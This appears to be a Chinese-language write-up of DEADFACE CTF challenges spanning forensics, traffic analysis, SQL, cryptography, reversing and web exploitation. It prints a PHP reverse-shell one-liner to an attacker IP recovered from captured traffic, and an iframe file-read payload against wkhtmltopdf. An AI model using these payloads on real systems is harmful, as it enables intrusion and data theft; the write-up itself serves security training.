# DEADFACE CTF
###### tags: `CTF`

## Starter
### Starter 1
![](https://i.imgur.com/nG3L8AZ.png)

讀 code of conduct，flag 在最下面

![](https://i.imgur.com/jltGWTG.png)


flag{I_acknowledge_the_rules}

### Starter 2
![](https://i.imgur.com/vnSCbTe.png)

flag 在內文

flag{cash_prizes}

### Starter 3
![](https://i.imgur.com/vn3Tdba.png)

進去網誌，搜尋標題 `Another year of mayhem`，找到是 `d34th` 在 5/30 發的文

flag{d34th_0530}

## OSINT
### Under Public Scrutiny
![](https://i.imgur.com/xm0HI0a.png)

在 ghosttown 搜尋 `github`，找到一篇 `Made a github link for projects` 的文章，裡面提到 github 的 account

![](https://i.imgur.com/DAud6QW.png)

在 github 中找到這個人，發現只有一個 repo

![](https://i.imgur.com/FPDCKQ9.png)

點進 repo，然後就拿到 flag 了

![](https://i.imgur.com/1pFX0AE.png)

flag{yAy_4_puBl1c_g1tHUB_rep0s}

### Fine Dining
![](https://i.imgur.com/MxJKYCL.png)

找餐廳

在 ghost town 搜尋 restaurant，發現這篇文章
https://ghosttown.deadface.io/t/suggestions-for-places-to-eat/68

然後能在文內發現一個連結

![](https://i.imgur.com/0xiqNe3.png)

點進去後是圖片

![](https://i.imgur.com/C9k188g.png)

flag 在裡面

flag{b1sh0p-pig-n_T4LL}

## Steganography
### The Goodest Boy
![](https://i.imgur.com/qO16BFr.png)

下載下來後，發現是一個 jpg，因此似乎可以嘗試使用 steghide 萃取檔案，只是需要密碼

從原文章來看，似乎是使用很簡單的 stego 技術

![](https://i.imgur.com/mF1y17P.png)

使用 xxd，發現在最後有一個像是密碼的東西

![](https://i.imgur.com/k8rr6k8.png)

使用 steghide 萃取出一個 pdf，內容為 flag

flag{whos_A_g00d_boi_bork_bork}

### Eye Know, Do You?
![](https://i.imgur.com/KCEkfcU.png)

下載下來發現是 jpg，不過嘗試 binwalk, exiftool, strings 等都沒有發現與 flag 有關的東西

不過值得注意一點的地方是，圖片中有很多空白，推測有可能 flag 使用與空白接近的顏色並藏在其中

小畫家點一點，發現 flag 藏在三角形下面

![](https://i.imgur.com/I8yOPwI.png)

用肉眼嘗試解密

flag{Deadface_Knows_All_Sees_All}

### Life's a Glitch
![](https://i.imgur.com/gulzWqY.png)

下載 gif 後，使用 stegsolver.jar 的 frame browser 查看每一楨的資訊

在 frame 23 和 24 中發現了 flag

![](https://i.imgur.com/quYzzC4.png)

flag{c0rrupt3d!}

### Mis-speLLLed
![](https://i.imgur.com/PICPkyW.png)

題目給了一個文字檔，內容如下

![](https://i.imgur.com/MaLwMkH.png)

可以看到應該是一篇故事，且其中有許多拼錯的地方

上網搜尋後，找到了這一篇原文故事
https://www.storyberries.com/halloween-stories-jack-o-lantern-bedtime-stories-for-kids/

使用 diffnow 比對

![](https://i.imgur.com/Q9qXRjH.png)

整理出拼錯的字，如下 (前者為題目的錯誤單字，後者為正確單字)
```
t v
t s
t h
  '
  '
b o
  '
u o
m l
s q
M J
b p
b d
s w
s w
x h
o u
t v
```

先不計入標點符號，將正確單字部分丟到 dcode.fr 分析

![](https://i.imgur.com/Sqb7BPx.png)

發現似乎有可能是 caesar cipher

解密出最可能的字為 `spellinGmatters`

![](https://i.imgur.com/iBiiLgG.png)

直接上傳，發現上傳失敗後將大寫 G 改成小寫就過了

flag{spellingmatters}

### (X) Keep Your Secrets

## forensics
### First Strike
![](https://i.imgur.com/NodavMk.png)

直接看 error.log，發現只有一個 ip `165.227.73.138` 一直在存取奇怪的 script，另外也發現 access.log 也幾乎只有這個 ip 的紀錄，推測是他在做攻擊

![](https://i.imgur.com/83VF5xJ.png)

![](https://i.imgur.com/5wDUaHk.png)


flag{165.227.73.138}

### Grave Digger 1
![](https://i.imgur.com/3bQ1o6Y.png)

使用 ssh 上去後，在 env 中發現了 flag

![](https://i.imgur.com/ad3c1ta.png)

flag{d34dF4C3_en1roN_v4r}

### Toolbox
![](https://i.imgur.com/uU9ISwr.png)

找該時間段，發現有一堆 nmap 的紀錄 ==

![](https://i.imgur.com/cWjTQbf.png)

flag{nmap}

### Agents of Chaos
![](https://i.imgur.com/EkLRtI5.png)

已知第一套掃描工具為 nmap，要找第 2 套的工具的第一個 UA

往下滑，發現在 nmap 後有一個工具 `Nikto` 的使用紀錄

![](https://i.imgur.com/QtVgGWV.png)

UA 就是那一大串

flag{Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)}

### Iterations
![](https://i.imgur.com/Doj2pNI.png)

翻 log 翻到後面流量高的地方，發現有用到工具 Hydra

![](https://i.imgur.com/auMWxc9.png)

Hydra 是用來嘗試爆破 admin 密碼的工具，很符合這題的敘述

結果直接交大寫不行，要小寫 ==

flag{hydra}

### Submission
![](https://i.imgur.com/oGnAD0G.png)

要找遺留的檔案名稱

拉到 log 最後面

![](https://i.imgur.com/v2QF8Ir.png)

可以看到，攻擊者一直嘗試使用 `info.php` 且後的 `?` 代表有帶參數，推測這應該是一個 webshell

flag{info.php}

## Traffic Analysis
### Dreaming of You
![](https://i.imgur.com/OKtqzml.png)

在流量分析可以看到，裡面有很多 telnet 的資料，而 telnet 是明文傳輸所以可以看得到內容

![](https://i.imgur.com/5CZRypH.png)

分析發現，前面一大半部分都是在嘗試登入，直到封包 1218 才成功進入 shell

![](https://i.imgur.com/Xh80CLp.png)

然後在封包 2084 ~ 2123，輸入指令 type 將 `2023Resolutions.txt` 檔案印出，內容為 flag

![](https://i.imgur.com/79J4Gmu.png)

flag{longing_for_nancy}

### Scans
![](https://i.imgur.com/dkEGbBh.png)

這題有夠靠北，都不給 scan type 範例的喔

流量如下

![](https://i.imgur.com/FekXG5V.png)

可以看到，攻擊方送出很多 SYN 的信號，當 port 有開時伺服器會回傳 SYN+ACK，但攻擊方並沒有回傳 ACK，算是很典型的 TCP SYN scan

flag{SYN}

### Passing on Complexity
![](https://i.imgur.com/WV1N2ak.png)

在封包 91642 找到有下 cat backup.py 的指令

![](https://i.imgur.com/CjzgKfu.png)

而 91643 回傳了內容

![](https://i.imgur.com/ZBy9Rt2.png)

內容如下
```python=
#!/usr/bin/env python3
from os import popen
popen('mysqldump -u backup -pbackup123 esu | gzip > /backups/backup_esu_$(date "+%Y%m%d%H%M%S").sql.gz')

cmd="php -r '$sock=fsockopen(\"165.227.73.138\",4815);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
popen(cmd)
```

password 為其中的 -pXXXXX

flag{backup123}

### Shells
![](https://i.imgur.com/DLND1KY.png)

要找 shell 相關的工具名稱

在 filter 出有 tcp data 的流量後，發現在封包 91275 的資料區塊發現有 `b374k` 的字樣

![](https://i.imgur.com/efF4Xpy.png)

由於 `b374k` 是一個知名的 webshell 工具，推測答案應該是這個

flag{b374k}

### Escalation
![](https://i.imgur.com/ZbfnRhz.png)

要找攻擊者加進現有檔案的檔案名稱和使用到的變數名

在封包 91610 和 91614 可以看到，攻擊者將指令用 echo 並 `>>` 的方式添加進 /opt/backup.py 中

![](https://i.imgur.com/E0QxGX1.png)

![](https://i.imgur.com/dhbvNQT.png)

因此檔案名稱為 `backup.py`，變數名為 `cmd`

flag{backup.py_cmd}

### The Root of All Evil
![](https://i.imgur.com/AssGVw8.png)

要找攻擊者剛進入 root 權限所留下的文字

filter 出具有 data 的資料後，在 91665 的封包開始找到找到似乎是攻擊者剛得到 root 權限 shell 的資訊

![](https://i.imgur.com/iPpdCiI.png)

在第 91711 的封包，找到攻擊者留下的 echo

![](https://i.imgur.com/vkEPkDW.png)

flag{pr1vesc_wi7h_cROn}

### New Addition
![](https://i.imgur.com/0gLvZWS.png)

要找攻擊者添加進資料庫的使用者

在封包 92112 找到有做 insert 進 user 資料表的動作

![](https://i.imgur.com/GWpDOqn.png)

完整指令如下
```sql=
mysql -u backup -pbackup123 -D esu -e "INSERT INTO users (username, first, last, email, street, city, state_id, zip, gender, dob) VALUES ('areed2022', 'Alexandra', 'Reed', 'fake@email.com', '830 Iowa Place', 'Reese', 23, '48757', 'f', '1999-08-19');"
```

使用者名稱為 areed2022

flag{areed2022}

### SHAshank Redemption
![](https://i.imgur.com/me1F07H.png)

找被偷走檔案的 hash

在封包 91821，發現攻擊者似乎有使用 nc 將 `backup_esu_20220727145001.sql.gz` 檔案傳回自己的伺服器

![](https://i.imgur.com/lmmf5wh.png)


此後在封包 91847 中，發現攻擊者有對此檔案做 sha1sum

![](https://i.imgur.com/6YJFpyv.png)

算出來的結果在封包 91850 中

![](https://i.imgur.com/Oqs4Cbo.png)

hash 為 `334a3d4f976cdf39d49b860afda77d6ac0f8a3c6`

flag{334a3d4f976cdf39d49b860afda77d6ac0f8a3c6}

## Programming
### Matrix
![](https://i.imgur.com/bQZs3uK.png)

要找一篇招募的文章，其中有這題的題目

搜尋 recruit，即可找到這篇文章
https://ghosttown.deadface.io/t/vetting-new-recruits/62/7

規則為輸入一個 5x4 的 array，要計算每一個 column 中的最小數的總和

![](https://i.imgur.com/kvLDG37.png)

但經測試，其實是要計算每一 row 的最小值總和，不確定是不是哪裡寫錯

解題腳本
```python=
from pwn import *
context.log_level = "debug"

conn = remote("code.deadface.io", 50000)

array = []
for _ in range(5):
    array.append(eval(conn.recvline().strip()))

sum = 0
# for i in range(4):
#     small = array[0][i]
#     for j in range(1,5):
#         num = array[j][i]
#         if(num < small):
#             small = num
#     sum += small
for i in range(5):
    small = array[i][0]
    for j in range(4):
        num = array[i][j]
        if(num < small):
            small = num
    sum += small

conn.send(str(sum).encode())

conn.interactive()
```

flag{j4cked_int0_th3_matr1x}

## SQL
### Counting Heads
![](https://i.imgur.com/tIMZE7k.png)

使用以下指令，進行初步設定:
```bash=
sudo mysql
> CREATE DATABASE myDB;
sudo mysql -u root -p myDB < esu.sql
```

此時即可將資料匯入創建好的 `myDB` database 中

首先使用 `show TABLES;` 查看有哪些 table
```
+------------------+
| Tables_in_myDB   |
+------------------+
| countries        |
| courses          |
| degree_types     |
| enrollments      |
| passwords        |
| payment_statuses |
| programs         |
| roles            |
| roles_assigned   |
| states           |
| term_courses     |
| terms            |
| users            |
+------------------+
```

可以看到其中有一個 `users`，既然題目要求要算總共有多少 user，所以輸入以下 query 計算

```sql=
SELECT count(*) from users;
```
```
+----------+
| count(*) |
+----------+
|     2400 |
+----------+
```

共有 2400 個

flag{2400}

### The Faculty
![](https://i.imgur.com/S87yTG0.png)

題目要找 user 中不是 student 的數量

回到上面的 `show TABLES;`，可以發現其中有兩個 table `roles` 和 `roles_assigned`，看起來和角色有關
```
+------------------+
| Tables_in_myDB   |
+------------------+
| countries        |
| courses          |
| degree_types     |
| enrollments      |
| passwords        |
| payment_statuses |
| programs         |
| roles            |
| roles_assigned   |
| states           |
| term_courses     |
| terms            |
| users            |
+------------------+
```

roles 的結構如下
```
+-----------+-------------+------+-----+---------+----------------+
| Field     | Type        | Null | Key | Default | Extra          |
+-----------+-------------+------+-----+---------+----------------+
| role_id   | int         | NO   | PRI | NULL    | auto_increment |
| role_name | varchar(56) | NO   | UNI | NULL    |                |
+-----------+-------------+------+-----+---------+----------------+
```

看起來是角色表，一個角色就是一列

其內容如下
```
+---------+---------------------+
| role_id | role_name           |
+---------+---------------------+
|       5 | Adjunct Professor   |
|       8 | Administration      |
|       4 | Associate Professor |
|       2 | Instructor          |
|       3 | Professor           |
|       6 | Research Assistant  |
|       7 | Research Associate  |
|       1 | Student             |
+---------+---------------------+
```

可以看到，相關的 `Student` 身分為 role_id 1

而 `roles_assigned` 結構如下
```
+------------------+------+------+-----+---------+----------------+
| Field            | Type | Null | Key | Default | Extra          |
+------------------+------+------+-----+---------+----------------+
| role_assigned_id | int  | NO   | PRI | NULL    | auto_increment |
| user_id          | int  | NO   | MUL | NULL    |                |
| role_id          | int  | NO   | MUL | NULL    |                |
+------------------+------+------+-----+---------+----------------+
```

看起來是將 `user_id` 和 `role_id` 做 mapping 的表格

最簡單的 query 是直接對 `roles_assigned` 做條件去除 `role_id` 為 1 的列，再取數量，如下

```sql=
SELECT count(*) FROM roles_assigned WHERE role_id != 1;
```

而要寫的清楚明瞭一點，可以將這兩個表格 join 一起，再篩選 `role_name` 不是 `Student` 的那些列，如下

```sql!
SELECT count(*) FROM roles_assigned INNER JOIN roles ON roles_assigned.role_id = roles.role_id WHERE roles.role_name != "Student";
```

二者都會得到數量 `627`
```
+----------+
| count(*) |
+----------+
|      627 |
+----------+
```

flag{627}

### Let's Hash It Out
![](https://i.imgur.com/eMvaAxH.png)

要找目標的 password hash

進入網頁搜尋 database 後，找到了這一篇
https://ghosttown.deadface.io/t/database-question/46

![](https://i.imgur.com/OuNPehz.png)

看起來目標是要找 administration, HR 之類的

在 roles 資料表，發現文中提到的身分只有 administration 存在
```
+---------+---------------------+
| role_id | role_name           |
+---------+---------------------+
|       5 | Adjunct Professor   |
|       8 | Administration      |
|       4 | Associate Professor |
|       2 | Instructor          |
|       3 | Professor           |
|       6 | Research Assistant  |
|       7 | Research Associate  |
|       1 | Student             |
+---------+---------------------+
```

role_id 是 8

篩選 role_id 是 8 的那些身分，計算人數

```sql=
select count(*) from roles_assigned where role_id = 8;
```
```
+----------+
| count(*) |
+----------+
|        1 |
+----------+
```

發現只有一個人

```
+------------------+---------+---------+
| role_assigned_id | user_id | role_id |
+------------------+---------+---------+
|             1440 |    1440 |       8 |
+------------------+---------+---------+
```

user_id 為 `1440`

在所有 table 中，存在一個叫 password 的 table
```
+------------------+
| Tables_in_myDB   |
+------------------+
| countries        |
| courses          |
| degree_types     |
| enrollments      |
| passwords        |
| payment_statuses |
| programs         |
| roles            |
| roles_assigned   |
| states           |
| term_courses     |
| terms            |
| users            |
+------------------+
```

欄位關係為
```
+-------------+--------------+------+-----+---------+----------------+
| Field       | Type         | Null | Key | Default | Extra          |
+-------------+--------------+------+-----+---------+----------------+
| password_id | int          | NO   | PRI | NULL    | auto_increment |
| password    | varchar(256) | NO   | UNI | NULL    |                |
| user_id     | int          | NO   | UNI | NULL    |                |
+-------------+--------------+------+-----+---------+----------------+
```

因此可以透過篩選 user_id 來找到 password hash

```sql=
select * from passwords where user_id = 1440;
```

```
+-------------+------------------------------------------+---------+
| password_id | password                                 | user_id |
+-------------+------------------------------------------+---------+
|        1440 | b487af41779cffb9572b982e1a0bf83f0eafbe05 |    1440 |
+-------------+------------------------------------------+---------+
```

hash 為 `b487af41779cffb9572b982e1a0bf83f0eafbe05`

flag{b487af41779cffb9572b982e1a0bf83f0eafbe05}

### Fall Classes
![](https://i.imgur.com/3QSEmmU.png)

要數有多少的秋季課程

在所有 table 中，可以看到主要有三個跟這題相關的資料表 - `courses`, `term_courses` 和 `terms`
```
+------------------+
| Tables_in_myDB   |
+------------------+
| countries        |
| courses          |
| degree_types     |
| enrollments      |
| passwords        |
| payment_statuses |
| programs         |
| roles            |
| roles_assigned   |
| states           |
| term_courses     |
| terms            |
| users            |
+------------------+
```

course 欄位資訊如下
```
+------------------+---------------+------+-----+---------+----------------+
| Field            | Type          | Null | Key | Default | Extra          |
+------------------+---------------+------+-----+---------+----------------+
| course_id        | int           | NO   | PRI | NULL    | auto_increment |
| title            | varchar(128)  | NO   |     | NULL    |                |
| level            | varchar(32)   | NO   |     | NULL    |                |
| description      | varchar(128)  | NO   | UNI | NULL    |                |
| long_description | varchar(1024) | YES  |     | NULL    |                |
| sem_hours        | int           | NO   |     | NULL    |                |
+------------------+---------------+------+-----+---------+----------------+
```

內容範例如下
```
+-----------+---------+-------+------------------------------------------------+------------------+-----------+
| course_id | title   | level | description                                    | long_description | sem_hours |
+-----------+---------+-------+------------------------------------------------+------------------+-----------+
|         1 | ACCT100 | 0     | ACCT100 - Accounting I                         |                  |         3 |
|         2 | ACCT101 | 0     | ACCT101 - Accounting II                        |                  |         3 |
|         3 | ACCT105 | 0     | ACCT105 - Accounting for Non Accounting Majors |                  |         3 |
+-----------+---------+-------+------------------------------------------------+------------------+-----------+
```

此資料表主要儲存的是有哪些的課程

terms 欄位資訊如下
```
+-------------+--------------+------+-----+---------+----------------+
| Field       | Type         | Null | Key | Default | Extra          |
+-------------+--------------+------+-----+---------+----------------+
| term_id     | int          | NO   | PRI | NULL    | auto_increment |
| term_name   | varchar(56)  | NO   | UNI | NULL    |                |
| start_date  | date         | NO   |     | NULL    |                |
| end_date    | date         | NO   |     | NULL    |                |
| description | varchar(128) | NO   |     | NULL    |                |
+-------------+--------------+------+-----+---------+----------------+
```

內容如下
```
+---------+------------+------------+------------+----------------------+
| term_id | term_name  | start_date | end_date   | description          |
+---------+------------+------------+------------+----------------------+
|       1 | SPRING2022 | 2022-04-04 | 2022-07-29 | Spring semester 2022 |
|       2 | FALL2022   | 2022-08-01 | 2022-11-25 | Fall semester 2022   |
+---------+------------+------------+------------+----------------------+
```

可以看到此資料表儲存的是學期的資訊，且僅有 2 列

term_courses 欄位資訊如下
```
+-------------+------+------+-----+---------+----------------+
| Field       | Type | Null | Key | Default | Extra          |
+-------------+------+------+-----+---------+----------------+
| term_crs_id | int  | NO   | PRI | NULL    | auto_increment |
| course_id   | int  | NO   | MUL | NULL    |                |
| term_id     | int  | NO   | MUL | NULL    |                |
| instructor  | int  | NO   | MUL | NULL    |                |
+-------------+------+------+-----+---------+----------------+
```

內容範例如下
```
+-------------+-----------+---------+------------+
| term_crs_id | course_id | term_id | instructor |
+-------------+-----------+---------+------------+
|           1 |       440 |       2 |        841 |
|           2 |       573 |       2 |        954 |
|           3 |       119 |       1 |        854 |
+-------------+-----------+---------+------------+
```

可以看到，這張表格主要是將 course 和 terms 做 mapping

秋季課程資訊為 terms 資料表中的 term_id 2，我們可以對 term_courses 資料表過濾出 term_id 為 2 的那些列並且做 disctinct count 查詢

```sql=
select count(distinct(course_id)) from term_courses where term_id = 2;
```
```
+----------------------------+
| count(distinct(course_id)) |
+----------------------------+
|                        405 |
+----------------------------+
```

共有 405 個

flag{405}

## Cryptography
### Pandora's Box
![](https://i.imgur.com/NeYPUW2.png)

圖片如下

![](https://i.imgur.com/Fi60sld.png)

可以看到，其中有一些數字及文字

嘗試一些加減法後，發現當文字往下數的話似乎符合英文單字 (如果超過則回 z 繼續)

解碼腳本
```python=
text = "guvz-qgz-pfv-tvz"
nums = "3686052608140516"

flag = ""

for i,c in zip(nums,text):
    flag += chr(ord(c) - int(i))

print(flag)
```

為了方便，最後一位直接改成用 z 開始

解出來的文字為 `dont-let-her-out`

flag{dont_let_her_out}

### "D" is for Dumb Mistakes
![](https://i.imgur.com/lpjlBCP.png)

一些公式如下

$phi = (p-1) \times (q-1)$
$d = e^{-1}\ (mod\ phi)$

計算腳本:
```python=
import Crypto.Util.number as cn

p = 1049
q = 2063
e = 777887

assert cn.isPrime(p) and cn.isPrime(q)

d = pow(e, -1, (p-1)*(q-1))
print(d)
```

算出來是 `1457215`

flag{d=1457215}

### "D" if for Decryption
![](https://i.imgur.com/MQ3CSI1.png)

一些公式如下

$m = c^d\ (mod\ n)$

計算腳本
```python=
import Crypto.Util.number as cn

p = 1049
q = 2063
n = p*q
e = 777887

assert cn.isPrime(p) and cn.isPrime(q)

d = pow(e, -1, (p-1)*(q-1))

text = list(map(int, "992478-1726930-1622358-1635603-1385290".split('-')))
for c in text:
	m = pow(c,d,n)
	print(chr(ord('a')+m-1), end='')
print()
```

得出明文為 `ghost`

flag{ghost}

### Going Old School
![](https://i.imgur.com/92CIL5Q.png)

圖片如下

![](https://i.imgur.com/YKgF8R3.png)

可以看到一張長得像是 vigenere cipher 的表格，以及下面有一個看起來像是盲人點字的東西

由於下面盲人點字部分較簡單，先從這邊開始

根據對照表

![](https://i.imgur.com/W3XoAjn.png)

得出內容為 `port 47980`

接著破解上面的部分

丟到 dcode.fr 分析後，看到似乎可以破解出 `WE ?????? TOMORROW` 的字樣

![](https://i.imgur.com/tkGbAf8.png)

因此對應的密鑰為 `GO ?????? OBLINSGO`，看起來頭尾可以接起來且根據長度推斷，後面 tomorrow 開頭的 t 所對應的密鑰 O 似乎是 `GO` 的 `O` 部分，因此中間的密鑰應該是 `BLINSG`

所以解密後文字為 `WE STRIKE TOMORROW`

這時推測這是密碼還是之類的，在連進 nc 時使用，但使用前面的 port 配合題目敘述的 host 連上後才發現這邊就給了 vigenere cipher 的 key

因此，這段應該是 flag 的部分

flag{WE STRIKE TOMORROW}

### Two Dead Boys
![](https://i.imgur.com/7AZPkrj.png)

從最上面主播名字可猜到是 vigenere cipher，使用 dcode.fr 解密

![](https://i.imgur.com/cTLI4Yd.png)

解密結果看起來最符合的是第一個

flag{Critical Thinking: Question EVERYTHING!}

## Reverse Engineering
### RansomWAR 1 - Let's HASH This Out, Fellas
![](https://i.imgur.com/M9m80eB.png)

計算 encryptor 的 sha512

下載後，使用 sha512sum 計算
```bash=
sha512sum encrypter03.exe
```

計算出來的 hash 為 `d5241cbd99afdd521fe9122b3ca77c8e2750a1fef050ecb88e6a5b91b74cf155fdae5b600e22ccceb97ad45a14fddf26394d066456969ed9e5514c8d681ebf44`

flag{d5241cbd:681ebf44}

### Cereal Killer 02
![](https://i.imgur.com/xotfe2h.png)

程式丟 ghidra，發現有 .NET 字樣

![](https://i.imgur.com/ZqQGtKz.png)

丟 dotpeak 分析

![](https://i.imgur.com/QmoX4Eo.png)

圖中的 buffer 和 second 是一堆會轉成 bytes 的數字

可以看到，當提示使用者輸入後，會將其做 md5，並比對是否等於 second 的內容，相同的話就會對 buffer 做 AES 解密 (key, iv 等會用 hash / second)

解題思路 1:
使用 crackstation 嘗試破解 md5，恰巧破的出來，為 `peanutbuttercrunch`

![](https://i.imgur.com/b7uHkig.png)

輸入後，得到 flag

![](https://i.imgur.com/SdvQsH3.png)

解題思路 2:
因已知 AES 參數，嘗試直接解密

data 為 buffer
key 為 second
iv 為 second

AES mode 為預設的 CBC
https://learn.microsoft.com/zh-tw/dotnet/api/system.security.cryptography.symmetricalgorithm.mode?view=net-6.0#system-security-cryptography-symmetricalgorithm-mode

![](https://i.imgur.com/kPeh0VU.png)

解密腳本
```python=
from Crypto.Cipher import AES

hash = bytes([174, 225, 238, 82, 98, 117, 124, 246, 123, 97, 159, 246, 62, 150, 114, 182])
buffer = bytes([67, 108, 129, 219, 96, 208, 229, 183, 223, 102, 171, 73, 158, 175, 125, 163, 145, 51, 214, 9, 99, 17, 82, 140, 243, 82, 58, 242, 5, 217, 224, 96, 179, 169, 152, 30, 13, 217, 28, 30, 158, 82, 197, 175, 15, 198, 219, 137])

aes = AES.new(key=hash, mode=AES.MODE_CBC, iv=hash)
flag = aes.decrypt(buffer)
print(flag)
```

解出來的是一樣的 flag

flag{Peanut-Butter-Crunch-FTW-For-DaZeal0t!}

### RansomWAR 2 - Indicators of YOU'RE HOSED!
![](https://i.imgur.com/Po8yh7x.png)

總而言之，要找連線的網址或是 user agent

原始軟體是使用 go 寫的，所以有找尋一些跟 golang reversing 有關的資料，主要是以下影片及相關資料

- [#HITBCW2021 D1 - Reversing GO Binaries With Ghidra - Albert Zsigovits and Dorka Palotay](https://www.youtube.com/watch?v=J2svN8h21oo)
- [Reverse Engineering Go Binaries with Ghidra - CUJO AI](https://cujo.com/reverse-engineering-go-binaries-with-ghidra/)
- [ThreatIntel/Scripts/Ghidra at master · getCUJO/ThreatIntel · GitHub](https://github.com/getCUJO/ThreatIntel/tree/master/Scripts/Ghidra)

也有安裝相關外掛，不確定是否有差

在 ghidra 中發現了 main.downloadFile 的函式，猜測應該裡面會有與網址或是 user agent 相關的資料

![](https://i.imgur.com/Ewy0fuD.png)

在裡面翻到第 92 行，發現了有 CanonicalMIMEHeaderKey 並帶有 string，在 string 中發現有 user-agent 字樣

![](https://i.imgur.com/fqiOhM2.png)
![](https://i.imgur.com/QFI96RZ.png)

但在字串中的剩餘部分看起來不像是 user agent 的文字，反倒像是函式名稱

因此推測 user agent 在下面一些的部分

在下面 96 行有一大串的文字，看起來開頭的部分很像是 user agent 的格式，因此推斷這應該是 user agent

user-agent: `DARKANGEL_DEADFACE_CRYPTOWARE/0.3`

由於先找到了 user agent，因此就不找 url 了

flag{DARKANGEL_DEADFACE_CRYPTOWARE/0.3}

### Cereal Killer 03
![](https://i.imgur.com/uvUMId4.png)

使用 linux elf 版本

在 ghidra 中，有 main 函式，內容整理如下

```clike=
undefined4 main(void)
{
    char local_225 [17];

    undefined *local_254 = &DAT_00012008;
    undefined *local_250 = &DAT_000124c9;
    undefined *local_24c = &DAT_000124d0;
    undefined *local_248 = &DAT_000125d4;
    undefined passphrase [512];
    
    int shift = 0;
    puts("What is the best and (not very) sp00kiest breakfast cereal?");
    printf("%s", "Please enter the passphrase: ");
    __isoc99_scanf("%s",passphrase);
    printf("%s", "What is the correct (obfuscated) shift value? ");
    __isoc99_scanf("%d",&shift);

    int local_264 = shift;
    for (int i = 0; i < 3; i = i + 1) {
        local_264 = local_264 << 1;
    }
    
    int iVar1 = (local_264 / 21329) / 14;
    int iVar2 = iVar1 + 12;
    if (iVar2 < 0) {
        iVar2 += 15;
    }
    
    int local_264 = (iVar2 >> 2) / 10 - 27;
    int j = 0;
    for (int i = 0; i < 256; i += local_264) {
        local_225[k] = local_24c[i];
        j += 1;
    }
    
    passphrase[0] = 0;
    printf("The ONE TRUE FLAG (and the best and least scary breakfast cereal) is: ");
    puts(local_225);
    return 0;
}
```

可以看到，其中的 passphrase 沒有任何作用，主要是會根據輸入的 shift 計算偏移量，並從 DAT_000124d0 中取得正確的 index

然而，該地址能印出來的就只有 flag 的字串，所以其實直接讀這個區塊的文字即可

![](https://i.imgur.com/dsSz2gz.png)

flag{4ppleJ@cks}

## Pwn
### Easy Creds
![](https://i.imgur.com/ipBITp3.png)

有一串看起來像是密碼的 hash，丟 john 試試看

使用 wordlist `rockyou.txt`

`john --wordlist=rockyou.txt hash.txt`

![](https://i.imgur.com/v6DkKRh.png)

破出密碼為 `123456789q`

flag{123456789q}

### Invoice
![](https://i.imgur.com/FmpJNKq.png)

總而言之，需要想辦法進入到網址中的 /admin

網頁連進去後，畫面如下

![](https://i.imgur.com/PGyceoV.png)

可以看到，基本上只有這三個輸入欄位

嘗試進入 /admin 路徑，發現要 local 才能看

![](https://i.imgur.com/QBJPbLw.png)

在首頁隨便測試輸入後，會將產生的資料輸出成 pdf

![](https://i.imgur.com/u2ugHNI.png)

通常這類產生 pdf 的都會有漏洞，不過要想辦法知道使用的軟體及版本

使用 burpsuite 後，發現 pdf 的開頭部分有寫明是 wkhtmltopdf 的 0.12.3 版

![](https://i.imgur.com/7mp20Ao.png)

上網搜尋後，發現了這篇文章
https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/

內容是講說由於 wkhtmltopdf 可以塞入 html，因此有 LFI 及 SSRF 等漏洞

嘗試建構 payload，使用 iframe 並讀取網頁原始碼，由於網頁是 express 寫的，因此這邊假設檔案名稱為 app.js

以下片段塞入 Description 區域，不過不確定是否也能塞在其他欄位

```htmlembedded!
<iframe src="file:///proc/self/cwd/app.js" height="2000" width="1000">
```

成功讀取

![](https://i.imgur.com/GEVIzvU.png)

不過看來，/admin 在對應到的是 /route/admin.js 的檔案，因此嘗試讀取

```htmlembedded!
<iframe src="file:///proc/self/cwd/routes/admin.js" height="2000" width="1000">
```

一樣成功讀取

![](https://i.imgur.com/dTyurVa.png)

flag 在原始碼中

flag{ssRf-thrU-d@-PDF-0K-Bas3d}